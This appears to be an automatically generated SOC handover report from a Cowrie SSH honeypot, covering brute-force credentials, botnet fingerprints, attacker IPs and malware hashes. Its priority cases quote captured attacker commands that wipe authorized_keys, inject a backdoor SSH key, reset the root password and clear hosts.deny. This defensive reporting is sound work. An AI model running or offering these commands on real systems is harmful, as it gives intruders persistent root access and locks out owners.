# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-02 |
| **Generated At** | 2026-04-02T05:41:39Z |
| **Shift Time** | 05:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **70** |
| Confirmed Threats | **60** |
| False Positives Filtered | **10** (14.3%) |
| Unique Attacker IPs | **45** |
| Countries of Origin | **19** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **34** |
| Unique Credential Pairs | **33** |
| Unique Usernames | **19** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `guest` | 4 |
| `345gs5662d34` | 2 |
| `blank` | 2 |
| `Root` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `qwerty1` | 2 |
| `12345` | 2 |
| `passwd` | 2 |
| `Aa.123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `Aa.123` | 1 |
| `centos` | `123123` | 1 |
| `root` | `qwe1234` | 1 |
| `blank` | `444444` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa.123` | `180.184.52.206` | 2026-04-02T02:05:19 |
| `root` | `qwe1234` | `180.184.52.206` | 2026-04-02T02:09:27 |
| `root` | `Vogue@2026` | `45.78.198.204` | 2026-04-02T03:58:55 |
| `root` | `3245gs5662d34` | `45.78.198.204` | 2026-04-02T03:58:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **70** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 28 |
| libssh | 22 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 28 | 28 |
| `03a80b21afa8...` | Modern SSH client | 22 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 28 | 28 | Mirai/variant |
| `03a80b21afa8...` | libssh | 22 | 4 | Modern SSH client |
| `95420f9d932d...` | Unknown | 3 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:8AdJ3s9ymnxN"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.184.52.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.78.198.204`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **45** |
| Unique ASNs | **38** |
| High-Risk ASNs | **32** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS134489` | S. B Link Network | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5b830cc09e47

| Field | Detail |
|---|---|
| **Source IP** | `180.184.52[.]206` |
| **First Seen** | 2026-04-02 02:05 |
| **Last Seen** | 2026-04-02 02:05 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8AdJ3s9ymnxN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 02:05:17` | `cowrie.session.connect` |
| `2026-04-02 02:05:17` | `cowrie.client.version` |
| `2026-04-02 02:05:18` | `cowrie.client.kex` |
| `2026-04-02 02:05:19` | `cowrie.login.success` |
| `2026-04-02 02:05:19` | `cowrie.session.params` |
| `2026-04-02 02:05:19` | `cowrie.command.input` |
| `2026-04-02 02:05:19` | `cowrie.command.failed` |
| `2026-04-02 02:05:20` | `cowrie.log.closed` |
| `2026-04-02 02:05:20` | `cowrie.session.params` |
| `2026-04-02 02:05:20` | `cowrie.command.input` |
| `2026-04-02 02:05:20` | `cowrie.session.file_download` |
| `2026-04-02 02:05:20` | `cowrie.log.closed` |
| `2026-04-02 02:05:34` | `cowrie.session.params` |
| `2026-04-02 02:05:34` | `cowrie.command.input` |
| `2026-04-02 02:05:34` | `cowrie.log.closed` |
| `2026-04-02 02:05:35` | `cowrie.session.params` |
| `2026-04-02 02:05:35` | `cowrie.command.input` |
| `2026-04-02 02:05:35` | `cowrie.log.closed` |
| `2026-04-02 02:05:35` | `cowrie.session.params` |
| `2026-04-02 02:05:35` | `cowrie.command.input` |
| `2026-04-02 02:05:35` | `cowrie.session.file_download` |
| `2026-04-02 02:05:35` | `cowrie.log.closed` |
| `2026-04-02 02:05:36` | `cowrie.session.params` |
| `2026-04-02 02:05:36` | `cowrie.command.input` |
| `2026-04-02 02:05:36` | `cowrie.log.closed` |
| `2026-04-02 02:05:36` | `cowrie.session.params` |
| `2026-04-02 02:05:36` | `cowrie.command.input` |
| `2026-04-02 02:05:36` | `cowrie.log.closed` |
| `2026-04-02 02:05:37` | `cowrie.session.params` |
| `2026-04-02 02:05:37` | `cowrie.command.input` |
| `2026-04-02 02:05:37` | `cowrie.command.input` |
| `2026-04-02 02:05:37` | `cowrie.log.closed` |
| `2026-04-02 02:05:37` | `cowrie.session.params` |
| `2026-04-02 02:05:37` | `cowrie.command.input` |
| `2026-04-02 02:05:37` | `cowrie.log.closed` |
| `2026-04-02 02:05:38` | `cowrie.session.params` |
| `2026-04-02 02:05:38` | `cowrie.command.input` |
| `2026-04-02 02:05:38` | `cowrie.log.closed` |
| `2026-04-02 02:05:39` | `cowrie.session.params` |
| `2026-04-02 02:05:39` | `cowrie.command.input` |
| `2026-04-02 02:05:39` | `cowrie.log.closed` |
| `2026-04-02 02:05:39` | `cowrie.session.params` |
| `2026-04-02 02:05:39` | `cowrie.command.input` |
| `2026-04-02 02:05:39` | `cowrie.log.closed` |
| `2026-04-02 02:05:40` | `cowrie.session.params` |
| `2026-04-02 02:05:40` | `cowrie.command.input` |
| `2026-04-02 02:05:40` | `cowrie.log.closed` |
| `2026-04-02 02:05:40` | `cowrie.session.params` |
| `2026-04-02 02:05:40` | `cowrie.command.input` |
| `2026-04-02 02:05:40` | `cowrie.log.closed` |
| `2026-04-02 02:05:41` | `cowrie.session.params` |
| `2026-04-02 02:05:41` | `cowrie.command.input` |
| `2026-04-02 02:05:41` | `cowrie.log.closed` |
| `2026-04-02 02:05:41` | `cowrie.session.params` |
| `2026-04-02 02:05:41` | `cowrie.command.input` |
| `2026-04-02 02:05:42` | `cowrie.log.closed` |
| `2026-04-02 02:05:42` | `cowrie.session.params` |
| `2026-04-02 02:05:42` | `cowrie.command.input` |
| `2026-04-02 02:05:42` | `cowrie.log.closed` |
| `2026-04-02 02:05:43` | `cowrie.session.params` |
| `2026-04-02 02:05:43` | `cowrie.command.input` |
| `2026-04-02 02:05:43` | `cowrie.log.closed` |
| `2026-04-02 02:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.52[.]206` to AbuseIPDB if not already reported
- [ ] Block `180.184.52[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d2286b6bd04

| Field | Detail |
|---|---|
| **Source IP** | `180.184.52[.]206` |
| **First Seen** | 2026-04-02 02:09 |
| **Last Seen** | 2026-04-02 02:09 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:X7VjE0bxD0on"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 02:09:24` | `cowrie.session.connect` |
| `2026-04-02 02:09:25` | `cowrie.client.version` |
| `2026-04-02 02:09:25` | `cowrie.client.kex` |
| `2026-04-02 02:09:27` | `cowrie.login.success` |
| `2026-04-02 02:09:27` | `cowrie.session.params` |
| `2026-04-02 02:09:27` | `cowrie.command.input` |
| `2026-04-02 02:09:27` | `cowrie.command.failed` |
| `2026-04-02 02:09:27` | `cowrie.log.closed` |
| `2026-04-02 02:09:28` | `cowrie.session.params` |
| `2026-04-02 02:09:28` | `cowrie.command.input` |
| `2026-04-02 02:09:28` | `cowrie.session.file_download` |
| `2026-04-02 02:09:28` | `cowrie.log.closed` |
| `2026-04-02 02:09:38` | `cowrie.session.params` |
| `2026-04-02 02:09:38` | `cowrie.command.input` |
| `2026-04-02 02:09:38` | `cowrie.log.closed` |
| `2026-04-02 02:09:38` | `cowrie.session.params` |
| `2026-04-02 02:09:38` | `cowrie.command.input` |
| `2026-04-02 02:09:38` | `cowrie.log.closed` |
| `2026-04-02 02:09:39` | `cowrie.session.params` |
| `2026-04-02 02:09:39` | `cowrie.command.input` |
| `2026-04-02 02:09:39` | `cowrie.session.file_download` |
| `2026-04-02 02:09:39` | `cowrie.log.closed` |
| `2026-04-02 02:09:39` | `cowrie.session.params` |
| `2026-04-02 02:09:39` | `cowrie.command.input` |
| `2026-04-02 02:09:40` | `cowrie.log.closed` |
| `2026-04-02 02:09:40` | `cowrie.session.params` |
| `2026-04-02 02:09:40` | `cowrie.command.input` |
| `2026-04-02 02:09:40` | `cowrie.log.closed` |
| `2026-04-02 02:09:40` | `cowrie.session.params` |
| `2026-04-02 02:09:40` | `cowrie.command.input` |
| `2026-04-02 02:09:40` | `cowrie.command.input` |
| `2026-04-02 02:09:41` | `cowrie.log.closed` |
| `2026-04-02 02:09:41` | `cowrie.session.params` |
| `2026-04-02 02:09:41` | `cowrie.command.input` |
| `2026-04-02 02:09:41` | `cowrie.log.closed` |
| `2026-04-02 02:09:41` | `cowrie.session.params` |
| `2026-04-02 02:09:41` | `cowrie.command.input` |
| `2026-04-02 02:09:42` | `cowrie.log.closed` |
| `2026-04-02 02:09:42` | `cowrie.session.params` |
| `2026-04-02 02:09:42` | `cowrie.command.input` |
| `2026-04-02 02:09:42` | `cowrie.log.closed` |
| `2026-04-02 02:09:42` | `cowrie.session.params` |
| `2026-04-02 02:09:42` | `cowrie.command.input` |
| `2026-04-02 02:09:43` | `cowrie.log.closed` |
| `2026-04-02 02:09:43` | `cowrie.session.params` |
| `2026-04-02 02:09:43` | `cowrie.command.input` |
| `2026-04-02 02:09:43` | `cowrie.log.closed` |
| `2026-04-02 02:09:44` | `cowrie.session.params` |
| `2026-04-02 02:09:44` | `cowrie.command.input` |
| `2026-04-02 02:09:44` | `cowrie.log.closed` |
| `2026-04-02 02:09:44` | `cowrie.session.params` |
| `2026-04-02 02:09:44` | `cowrie.command.input` |
| `2026-04-02 02:09:44` | `cowrie.log.closed` |
| `2026-04-02 02:09:45` | `cowrie.session.params` |
| `2026-04-02 02:09:45` | `cowrie.command.input` |
| `2026-04-02 02:09:45` | `cowrie.log.closed` |
| `2026-04-02 02:09:45` | `cowrie.session.params` |
| `2026-04-02 02:09:45` | `cowrie.command.input` |
| `2026-04-02 02:09:45` | `cowrie.log.closed` |
| `2026-04-02 02:09:46` | `cowrie.session.params` |
| `2026-04-02 02:09:46` | `cowrie.command.input` |
| `2026-04-02 02:09:46` | `cowrie.log.closed` |
| `2026-04-02 02:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.52[.]206` to AbuseIPDB if not already reported
- [ ] Block `180.184.52[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a26cd222f27

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]204` |
| **First Seen** | 2026-04-02 03:58 |
| **Last Seen** | 2026-04-02 03:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 03:58:54` | `cowrie.session.connect` |
| `2026-04-02 03:58:54` | `cowrie.client.version` |
| `2026-04-02 03:58:54` | `cowrie.client.kex` |
| `2026-04-02 03:58:55` | `cowrie.login.success` |
| `2026-04-02 03:58:55` | `cowrie.session.params` |
| `2026-04-02 03:58:55` | `cowrie.command.input` |
| `2026-04-02 03:58:55` | `cowrie.command.failed` |
| `2026-04-02 03:58:55` | `cowrie.log.closed` |
| `2026-04-02 03:58:55` | `cowrie.session.params` |
| `2026-04-02 03:58:55` | `cowrie.command.input` |
| `2026-04-02 03:58:55` | `cowrie.session.file_download` |
| `2026-04-02 03:58:55` | `cowrie.log.closed` |
| `2026-04-02 03:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-147aff34ed51

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]204` |
| **First Seen** | 2026-04-02 03:58 |
| **Last Seen** | 2026-04-02 03:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 03:58:57` | `cowrie.session.connect` |
| `2026-04-02 03:58:57` | `cowrie.client.version` |
| `2026-04-02 03:58:57` | `cowrie.client.kex` |
| `2026-04-02 03:58:58` | `cowrie.login.success` |
| `2026-04-02 03:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.184.52[.]206` | **17** | 2026-04-02 02:03 | 2026-04-02 02:33 | 30m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.218.118[.]203` | **4** | 2026-04-02 04:30 | 2026-04-02 04:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | **3** | 2026-04-02 04:34 | 2026-04-02 05:13 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.13.4[.]128` | 1 | 2026-04-02 04:52 | 2026-04-02 04:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.174.34[.]49` | 1 | 2026-04-02 02:31 | 2026-04-02 02:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.25.107[.]43` | 1 | 2026-04-02 04:33 | 2026-04-02 04:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.28.73[.]142` | 1 | 2026-04-02 05:24 | 2026-04-02 05:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.50.51[.]119` | 1 | 2026-04-02 03:56 | 2026-04-02 03:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.7[.]10` | 1 | 2026-04-02 03:55 | 2026-04-02 03:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.45.101[.]159` | 1 | 2026-04-02 03:19 | 2026-04-02 03:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.160.166[.]237` | 1 | 2026-04-02 04:25 | 2026-04-02 04:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.224.15[.]67` | 1 | 2026-04-02 03:50 | 2026-04-02 03:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.117.251[.]230` | 1 | 2026-04-02 03:59 | 2026-04-02 04:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `122.166.253[.]226` | 1 | 2026-04-02 05:21 | 2026-04-02 05:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `130.185.96[.]126` | 1 | 2026-04-02 02:42 | 2026-04-02 02:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `156.238.86[.]2` | 1 | 2026-04-02 04:44 | 2026-04-02 04:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.90.128[.]97` | 1 | 2026-04-02 02:07 | 2026-04-02 02:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.167.207[.]234` | 1 | 2026-04-02 02:03 | 2026-04-02 02:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.255.47[.]190` | 1 | 2026-04-02 04:41 | 2026-04-02 04:41 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.222.55[.]187` | 1 | 2026-04-02 04:21 | 2026-04-02 04:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `192.72.6[.]213` | 1 | 2026-04-02 03:01 | 2026-04-02 03:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.188.187[.]205` | 1 | 2026-04-02 03:06 | 2026-04-02 03:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.190.180[.]19` | 1 | 2026-04-02 05:01 | 2026-04-02 05:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.46.45[.]121` | 1 | 2026-04-02 05:29 | 2026-04-02 05:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.221.158[.]216` | 1 | 2026-04-02 05:10 | 2026-04-02 05:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.96.11[.]230` | 1 | 2026-04-02 02:43 | 2026-04-02 02:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.149.191[.]246` | 1 | 2026-04-02 03:30 | 2026-04-02 03:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.46[.]144` | 1 | 2026-04-02 04:49 | 2026-04-02 04:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.134.187[.]231` | 1 | 2026-04-02 04:15 | 2026-04-02 04:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.154.134[.]146` | 1 | 2026-04-02 02:12 | 2026-04-02 02:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.59.33[.]109` | 1 | 2026-04-02 02:27 | 2026-04-02 02:27 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.78.198[.]204` | 1 | 2026-04-02 03:58 | 2026-04-02 03:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]11` | 1 | 2026-04-02 03:19 | 2026-04-02 03:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.217.255[.]171` | 1 | 2026-04-02 03:11 | 2026-04-02 03:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.22.255[.]28` | 1 | 2026-04-02 02:47 | 2026-04-02 02:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
